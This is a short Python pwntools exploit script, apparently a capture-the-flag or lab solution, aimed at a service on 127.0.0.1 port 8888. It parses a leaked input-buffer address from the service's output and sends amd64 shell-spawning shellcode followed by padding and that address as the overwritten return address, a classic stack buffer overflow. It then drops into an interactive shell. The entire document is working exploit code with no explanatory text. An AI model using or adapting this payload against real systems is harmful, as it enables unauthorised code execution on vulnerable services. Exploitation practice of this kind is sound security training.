#!/usr/bin/env python
# coding=utf-8
from pwn import *
ip   = '127.0.0.1'
prot = 8888
r = remote(ip, prot)
#r = process("./shellcode")
context(arch = 'amd64', os = 'linux')
shellcode = asm(shellcraft.amd64.linux.sh())
data = r.recv()
address = data.replace(b'Your address of input buffer is ', b'')
address = address.replace(b'\n', b'')
address = address.decode("utf-8")
address = int(address[2:], 16)
r.sendline(shellcode + (b"A" * 88) + (b"x" * 8) + p64(address))
r.interactive()
